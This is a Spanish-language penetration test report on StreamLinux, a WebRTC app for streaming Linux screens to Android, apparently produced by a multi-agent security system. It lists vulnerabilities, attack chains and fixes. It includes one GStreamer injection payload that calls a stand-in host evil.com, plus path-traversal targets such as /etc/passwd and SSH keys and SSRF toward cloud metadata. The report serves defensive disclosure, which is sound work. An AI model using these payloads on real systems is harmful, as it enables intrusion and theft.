# Reporte de Pruebas de Penetración de Seguridad

**Generado:** 2026-01-26 04:52:21 UTC

# Resumen Ejecutivo

StreamLinux es una aplicación de código abierto basada en WebRTC para transmitir pantallas de escritorio Linux a dispositivos Android. Una evaluación de seguridad integral de caja blanca reveló que la aplicación está en desarrollo alpha temprano con múltiples vulnerabilidades de seguridad críticas que la hacen inadecuada para uso en producción o lanzamiento público sin un endurecimiento de seguridad significativo.

**Postura de Riesgo General: CRÍTICA**

La evaluación identificó más de 14 vulnerabilidades críticas y de alta severidad en los cuatro componentes (Servidor de Señalización, GUI de Linux, Host de Linux, Cliente Android). Los problemas más severos permiten compromiso completo del sistema, acceso no autorizado a todas las sesiones de streaming, ataques completos de intermediario (MITM), y exposición de la red interna.

**Fallos de Seguridad Principales:**

1. **Autenticación y Autorización Fundamentalmente Rotas**
   - La evasión de validación de tokens permite que tokens vacíos omitan la autenticación (hub.go:664)
   - No se requiere autenticación para conexiones de host o mensajes de control
   - Los endpoints HTTP sin autenticar exponen salas activas y hosts
   - Tokens de respaldo predecibles basados en SHA256(machine_id + timestamp)

2. **Problemas de Seguridad de Memoria en Código Nativo**
   - Desbordamiento de entero en el cálculo de memoria compartida X11 permite desbordamiento de búfer → RCE
   - Múltiples operaciones memcpy inseguras con tamaños no confiables
   - Gestión manual de memoria sin verificación adecuada de límites

3. **Seguridad de Red Completamente Ausente**
   - Validación de certificados SSL/TLS deshabilitada (ssl.CERT_NONE)
   - Cliente Android permite tráfico en texto claro (usesCleartextTraffic="true")
   - Sin fijación de certificados en ninguna parte de la aplicación
   - CORS completamente abierto, validación de origen deshabilitada

4. **Vulnerabilidades de Inyección en Todo el Sistema**
   - Inyección de pipeline GStreamer vía parámetro de servidor STUN
   - Traversal de ruta en manejo de archivos de configuración
   - SSRF vía configuración arbitraria de servidor STUN/TURN
   - Análisis de datos de código QR sin validar

**Impacto en el Negocio:**

- **Confidencialidad de Datos:** Compromiso completo - atacantes pueden interceptar todas las sesiones de streaming, capturar contenido de pantalla, audio y señalización WebRTC
- **Integridad del Sistema:** Compromiso total posible vía múltiples vectores de RCE (desbordamiento de búfer, inyección GStreamer)
- **Disponibilidad:** Denegación de servicio vía múltiples vectores de ataque
- **Seguridad de Red:** Exposición de red interna vía SSRF, permitiendo a atacantes pivotar a servicios internos

**Recomendación:**

StreamLinux NO debe usarse en entornos de producción ni distribuirse a usuarios finales hasta que todas las vulnerabilidades críticas sean remediadas. La aplicación requiere cambios fundamentales en la arquitectura de seguridad incluyendo autenticación adecuada, validación de entrada, seguridad de memoria y cifrado de red.

# Metodología

**Enfoque de Evaluación**

Este compromiso siguió prácticas estándar de la industria de pruebas de penetración de caja blanca alineadas con la Guía de Pruebas de Seguridad Web de OWASP (WSTG), Pruebas de Seguridad de Aplicaciones Móviles de OWASP (MAST), y mejores prácticas de codificación segura para aplicaciones C/C++.

**Tipo de Compromiso:** Evaluación de seguridad de caja blanca con acceso completo al código fuente

**Alcance:**
- Repositorio: https://github.com/MrVanguardia/streamlinux
- Componentes: Servidor de Señalización (Go), GUI de Linux (Python), Host de Linux (C++), Cliente Android (Android/Kotlin)
- Líneas de Código Analizadas: ~10,000+ en todos los componentes

**Metodología de Pruebas:**

**Fase 1: Mapeo de Arquitectura y Modelado de Amenazas**
- Desplegados 4 agentes especializados para mapear la arquitectura de cada componente
- Identificados todos los puntos de entrada, flujos de datos, límites de confianza y controles de seguridad
- Documentados mecanismos de autenticación, gestión de sesiones e IPC
- Analizadas cadenas de dependencias y uso de bibliotecas de terceros

**Fase 2: Descubrimiento de Vulnerabilidades**
- Desplegados 8+ agentes de validación especializados para tipos de vulnerabilidades de alto impacto
- Análisis estático automatizado usando herramientas de seguridad (semgrep, bandit, eslint)
- Revisión manual de código enfocada en rutas de código críticas para la seguridad
- Fuzzing y pruebas de validación de entrada

**Fase 3: Explotación y Validación**
- Desarrolladas pruebas de concepto de exploits para todos los hallazgos críticos
- Verificada la explotabilidad e impacto mediante pruebas dinámicas
- Encadenadas vulnerabilidades para demostrar rutas de ataque de máximo impacto
- Creados scripts de PoC completos y documentación

**Categorías de Vulnerabilidades Probadas:**
- Autenticación y Autorización (Control de Acceso Roto, IDOR)
- Validación de Entrada (SQLi, XSS, Inyección de Comandos, SSRF)
- Seguridad de Memoria (Desbordamientos de Búfer, Desbordamientos de Entero, Use-After-Free)
- Seguridad de Red (SSL/TLS, Fijación de Certificados, CORS)
- Gestión de Sesiones (Manejo de Tokens, Ataques de Repetición)
- Operaciones de Archivo (Traversal de Ruta, Acceso Arbitrario a Archivos)
- Seguridad Móvil (Validación de Intent, Almacenamiento de Credenciales)

**Manejo de Evidencia:**

Todas las vulnerabilidades fueron validadas con código de prueba de concepto funcional. Los hallazgos están documentados con:
- Rutas de archivo exactas y números de línea
- Fragmentos de código mostrando implementaciones vulnerables
- Instrucciones de reproducción paso a paso
- Scripts de exploit funcionales
- Puntuaciones de severidad CVSS v3.1
- Recomendaciones específicas de remediación

**Herramientas y Técnicas:**
- Análisis estático: semgrep, bandit, eslint, trufflehog
- Revisión manual de código en 4 lenguajes (Go, Python, C++, Kotlin)
- Scripts de exploit personalizados en Python
- Pruebas web: automatización de navegador, análisis de proxy
- Sistema multi-agente con 21 agentes de seguridad especializados

# Análisis Técnico

**Hallazgos Técnicos Consolidados**

Esta sección resume las vulnerabilidades confirmadas que requieren remediación inmediata. Cada vulnerabilidad ha sido validada con código de prueba de concepto y documentada en reportes de vulnerabilidad detallados.

**1. CRÍTICO: Desbordamiento de Entero en Memoria Compartida X11 → Ejecución Remota de Código**
- **ID de Vulnerabilidad:** vuln-0001
- **Ubicación:** linux-host/src/x11_capture.cpp:86
- **Puntuación CVSS:** 9.8 (Crítico)
- **Causa Raíz:** El cálculo `m_shm_size = width * height * 4` se desborda para dimensiones grandes
- **Impacto:** El atacante puede provocar desbordamiento de entero → asignación insuficiente de memoria compartida → desbordamiento de búfer en memcpy → corrupción de memoria → RCE
- **Vector de Ataque:** Enviar mensaje de control SetResolution malicioso vía canal de datos WebRTC con valores de ancho/alto manipulados (ej., 65536x65536 causa m_shm_size=0)
- **Componente Afectado:** Host de Linux (código nativo C++)

**2. CRÍTICO: Validación de Certificados SSL/TLS Deshabilitada → MITM Completo**
- **ID de Vulnerabilidad:** vuln-0012
- **Ubicación:** linux-gui/webrtc_streamer.py:179
- **Puntuación CVSS:** 10.0 (Crítico)
- **Causa Raíz:** `sslopt={"cert_reqs": ssl.CERT_NONE}` deshabilita toda validación de certificados
- **Impacto:** El atacante puede realizar ataques MITM, interceptar toda la señalización WebSocket, capturar claves SDP/cripto, secuestrar sesiones de streaming
- **Vector de Ataque:** MITM de red simple (ARP spoofing, DNS spoofing, proxy malicioso) - el cliente acepta cualquier certificado
- **Componente Afectado:** GUI de Linux (conexiones WebSocket)

**3. CRÍTICO: Evasión de Autenticación por Token → Acceso No Autorizado a Salas**
- **ID de Vulnerabilidad:** vuln-0014
- **Ubicación:** signaling-server/internal/hub/hub.go:664
- **Puntuación CVSS:** 9.8 (Crítico)
- **Causa Raíz:** `if !isHost && hub.security.RequireToken && token != ""` solo valida si el token no está vacío
- **Impacto:** Tokens vacíos evaden completamente la autenticación, permitiendo acceso no autorizado a cualquier sala de streaming
- **Vector de Ataque:** Conectar sin parámetro de token o enviar cadena de token vacía
- **Componente Afectado:** Servidor de Señalización

**4. CRÍTICO: Evasión de Autenticación del Canal de Control → Control No Autorizado de Stream**
- **ID de Vulnerabilidad:** vuln-0005
- **Ubicación:** linux-host/src/control_channel.cpp:136-140
- **Puntuación CVSS:** 9.8 (Crítico)
- **Causa Raíz:** parse_message() es un stub que retorna éxito sin validación
- **Impacto:** Cualquier peer WebRTC puede enviar mensajes de control para manipular resolución, bitrate, pausar/reanudar streams
- **Vector de Ataque:** Enviar mensajes de control JSON vía canal de datos WebRTC - todos aceptados sin autenticación
- **Componente Afectado:** Host de Linux

**5. CRÍTICO: Inyección de Pipeline GStreamer → RCE vía Elementos Arbitrarios**
- **ID de Vulnerabilidad:** vuln-0011
- **Ubicación:** linux-gui/webrtc_streamer.py:564, 587
- **Puntuación CVSS:** 9.6 (Crítico)
- **Causa Raíz:** El parámetro del servidor STUN se interpola directamente en el pipeline GStreamer sin validación
- **Impacto:** Puede inyectar elementos GStreamer arbitrarios vía carácter '!' → operaciones de archivo, exfiltración de datos, SSRF, potencial RCE
- **Vector de Ataque:** Establecer valor malicioso de servidor STUN: `stun://evil.com:19302 ! filesrc location=/tmp/pwned.txt`
- **Componente Afectado:** GUI de Linux

**6. CRÍTICO: SSRF vía Configuración de Servidor STUN/TURN → Acceso a Red Interna**
- **ID de Vulnerabilidad:** vuln-0003
- **Ubicación:** linux-gui/webrtc_streamer.py:564, 587
- **Puntuación CVSS:** 9.1 (Crítico)
- **Causa Raíz:** Sin validación en URLs de servidor STUN/TURN
- **Impacto:** Acceso a direcciones IP internas (127.0.0.1, 169.254.169.254), escaneo de redes internas, exfiltración de metadatos de nube
- **Vector de Ataque:** Configurar IP interna como servidor STUN → la aplicación se conecta a recursos internos
- **Componente Afectado:** GUI de Linux

**7. ALTO: Traversal de Ruta en Gestor de Configuración → Acceso Arbitrario a Archivos**
- **ID de Vulnerabilidad:** vuln-0004
- **Ubicación:** linux-host/src/config_manager.cpp:35, 62
- **Puntuación CVSS:** 7.5 (Alto)
- **Causa Raíz:** Las rutas de configuración controladas por el usuario carecen de sanitización
- **Impacto:** Leer archivos arbitrarios (/etc/passwd, claves SSH), escribir en ubicaciones arbitrarias
- **Vector de Ataque:** Usar secuencias "../" o rutas absolutas en el parámetro --config
- **Componente Afectado:** Host de Linux

**8. ALTO: Tráfico en Texto Claro Habilitado en Android → MITM**
- **ID de Vulnerabilidad:** vuln-0013
- **Ubicación:** android-client/app/src/main/AndroidManifest.xml:26
- **Puntuación CVSS:** 8.1 (Alto)
- **Causa Raíz:** `android:usesCleartextTraffic="true"` permite HTTP/WS en texto plano
- **Impacto:** MITM completo de señalización WebSocket, intercepción de SDP, secuestro de sesión
- **Vector de Ataque:** MITM de red - el cliente Android se conecta sin validación TLS
- **Componente Afectado:** Cliente Android

**Problemas Adicionales de Alta Severidad (No Reportados Completamente Aquí):**
- Tokens de respaldo predecibles (basados en SHA256, sin aleatoriedad)
- Vulnerabilidad de repetición de tokens (sin cumplimiento de uso único)
- Endpoints HTTP sin autenticar (/rooms, /hosts exponen sesiones activas)
- Suplantación de rol de host (solo cabecera X-Client-Type)
- Validación de origen deshabilitada (CheckOrigin retorna true)
- Sin fijación de certificados en cliente Android OkHttp
- Almacenamiento inseguro de credenciales (SharedPreferences en texto plano)
- Análisis de código QR sin validar (vectores SSRF, inyección)
- Validación insuficiente de Intent en MainActivity
- Validación de certificados WebRTC faltante
- Múltiples desbordamientos de búfer de frame (wayland_capture.cpp, pipewire_audio.cpp)
- Análisis de enteros de configuración sin validación (std::stoi/stoul sin manejo de excepciones)
- Permisos de archivo inseguros (644 en settings.json)

**Cadenas de Explotación Demostradas:**

1. **MITM → Secuestro de Sesión:** Evasión SSL + tráfico en texto claro → interceptar WebSocket → capturar SDP/ICE → secuestrar stream
2. **Inyección de Código QR → RCE:** Código QR malicioso → inyección GStreamer → ejecución de elemento arbitrario
3. **SSRF → Acceso a Red Interna:** Servidor STUN arbitrario → conexiones a IP internas → robo de metadatos de nube
4. **Evasión de Auth → Toma de Sala:** Token vacío → unirse a sala sin autorización → interceptar señalización → inyectar mensajes maliciosos

**Problemas de Seguridad Sistémicos:**

- **Sin Defensa en Profundidad:** Puntos únicos de fallo en todo el sistema (ej., sin autenticación adicional más allá de tokens)
- **Validación de Entrada Faltante:** Datos controlados por el usuario fluyen a operaciones críticas sin sanitización
- **Valores por Defecto Inseguros:** Tráfico en texto claro permitido, SSL deshabilitado, CORS completamente abierto
- **Seguridad de Memoria:** El código C++ usa operaciones inseguras sin verificación de límites
- **Autenticación Rota:** Sistema de tokens fundamentalmente defectuoso con múltiples vectores de evasión
- **Divulgación de Información:** Trazas de pila, mensajes de error detallados, logging verboso

# Recomendaciones

**Prioridad 0 - REMEDIACIÓN INMEDIATA (Crítico - Corregir Antes de Cualquier Uso):**

1. **Corregir Lógica de Validación de Token (Servidor de Señalización)**
   - Cambiar hub.go:664 de `token != ""` a validar tokens no vacíos
   - Requerir token válido para TODAS las conexiones de clientes
   - Rechazar tokens vacíos/faltantes completamente
   - Código: `if !isHost && hub.security.RequireToken { validateToken(token) }`

2. **Habilitar Validación de Certificados SSL/TLS (GUI de Linux)**
   - Cambiar webrtc_streamer.py:179 de ssl.CERT_NONE a ssl.CERT_REQUIRED
   - Agregar validación de bundle CA usando certifi
   - Implementar verificación de hostname
   - Código: `sslopt={"cert_reqs": ssl.CERT_REQUIRED, "ca_certs": certifi.where()}`

3. **Corregir Desbordamiento de Entero X11 (Host de Linux)**
   - Agregar verificación de desbordamiento antes del cálculo de m_shm_size
   - Usar aritmética de enteros segura o verificación de límites
   - Rechazar combinaciones inválidas de ancho/alto
   - Código: `if (width > 0 && height > 0 && width <= MAX_WIDTH && height <= MAX_HEIGHT && width * height <= MAX_PIXELS) { ... }`

4. **Implementar Validación de Entrada para Servidor STUN (GUI de Linux)**
   - Validar URLs de servidor STUN/TURN con patrón regex
   - Bloquear rangos de IP privadas (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16)
   - Implementar funcionalidad de lista blanca de servidores
   - Sanitizar caracteres especiales ('!' usado para inyección GStreamer)

5. **Implementar Autenticación del Canal de Control (Host de Linux)**
   - Agregar autenticación/autorización a parse_message()
   - Validar remitente antes de procesar mensajes de control
   - Implementar mensajes firmados o secreto compartido
   - Rechazar mensajes de peers no autorizados

**Prioridad 1 - ALTO (Corregir Antes de Producción):**

6. **Deshabilitar Tráfico en Texto Claro (Android)**
   - Eliminar android:usesCleartextTraffic="true" de AndroidManifest.xml
   - Crear network_security_config.xml forzando solo HTTPS/WSS
   - Agregar fijación de certificados en cliente OkHttp
   - Probar con mitmproxy para verificar que conexiones en texto claro están bloqueadas

7. **Implementar Generación Adecuada de Tokens**
   - Usar tokens aleatorios criptográficamente seguros (secrets.token_urlsafe())
   - Eliminar generación de tokens predecibles basada en SHA256
   - Agregar expiración de tokens y mecanismo de renovación
   - Implementar tokens de uso único para prevenir repetición

8. **Agregar Validación de Ruta (Host de Linux)**
   - Sanitizar parámetro --config para prevenir traversal de ruta
   - Restringir archivos de configuración al directorio home del usuario
   - Usar os.path.abspath() y validar prefijo de ruta
   - Rechazar rutas con secuencias ".." o rutas absolutas fuera de directorios permitidos

9. **Agregar Autenticación a Endpoints HTTP (Servidor de Señalización)**
   - Requerir autenticación para endpoints /rooms y /hosts
   - Implementar autenticación basada en clave API o token para rutas HTTP
   - Agregar limitación de tasa para prevenir enumeración
   - Eliminar información sensible de endpoints públicos

10. **Implementar Autenticación de Host (Servidor de Señalización)**
    - Agregar TLS mutuo o JWT firmado para autenticación de host
    - Eliminar dependencia de cabecera X-Client-Type (fácilmente suplantable)
    - Verificar identidad del host antes de permitir propiedad de sala
    - Implementar sistema de registro de hosts

**Prioridad 2 - MEDIO (Mejorar Postura de Seguridad):**

11. **Agregar Validación de Entrada Integral**
    - Validar todas las entradas de usuario (longitud, formato, conjunto de caracteres)
    - Implementar capa de validación centralizada
    - Usar análisis con tipos seguros (evitar std::stoi/stoul sin manejo de excepciones)
    - Agregar verificaciones de rango en todas las entradas numéricas

12. **Implementar Fijación de Certificados**
    - Fijar certificado del servidor de señalización en cliente Android
    - Agregar fijación de certificados en cliente WebSocket de GUI de Linux
    - Implementar mecanismo de rotación de fijación
    - Fallar de forma segura en caso de desajuste de fijación

13. **Corregir Problemas de Seguridad de Memoria (Host de Linux)**
    - Agregar verificación de límites a todas las operaciones memcpy
    - Usar punteros inteligentes o RAII para gestión de memoria
    - Implementar verificaciones de desbordamiento en todas las operaciones aritméticas
    - Usar C++ moderno (std::vector, std::string) en lugar de arreglos C

14. **Almacenamiento Seguro de Credenciales (Android)**
    - Migrar a Android Keystore para datos sensibles
    - Usar EncryptedSharedPreferences para configuraciones
    - Deshabilitar respaldo para preferencias sensibles
    - Implementar autenticación biométrica para acceso

15. **Agregar Cabeceras de Seguridad y Configuración CORS**
    - Implementar validación adecuada de origen (CheckOrigin)
    - Restringir CORS solo a orígenes permitidos
    - Agregar cabeceras de seguridad (CSP, X-Frame-Options, etc.)
    - Eliminar Access-Control-Allow-Origin con comodín

16. **Implementar Logging y Monitoreo**
    - Registrar todos los intentos de autenticación (éxito/fallo)
    - Alertar sobre patrones sospechosos (fallos repetidos, tokens inválidos)
    - Registro de auditoría para eventos de seguridad (mensajes de control, cambios de configuración)
    - Implementar limitación de tasa y detección de anomalías

**Recomendaciones de Pruebas:**

- Realizar pruebas dinámicas de seguridad de aplicaciones (DAST) con herramientas automatizadas
- Conducir pruebas de penetración con profesionales de seguridad
- Implementar fuzzing para componentes de código nativo
- Probar todas las remediaciones con scripts de exploit antes del despliegue
- Realizar pruebas de regresión para asegurar que las correcciones no introduzcan nuevas vulnerabilidades

**Mejores Prácticas de Desarrollo:**

- Implementar estándares de codificación segura en todos los componentes
- Agregar pruebas unitarias de seguridad para todas las funciones críticas
- Realizar revisiones de código de seguridad antes de fusionar
- Usar herramientas de análisis estático en el pipeline CI/CD
- Implementar escaneo de dependencias para bibliotecas de terceros
- Agregar documentación de seguridad y modelado de amenazas para nuevas características

**Mejoras de Arquitectura a Largo Plazo:**

- Rediseñar el sistema de autenticación con primitivos criptográficos adecuados
- Implementar cifrado de extremo a extremo para todas las sesiones de streaming
- Agregar proceso de arranque seguro (sin credenciales codificadas)
- Implementar gestión adecuada de sesiones con ciclo de vida seguro de tokens
- Considerar auditoría de seguridad formal antes del lanzamiento a producción
- Implementar programa de recompensas por bugs para evaluación continua de seguridad
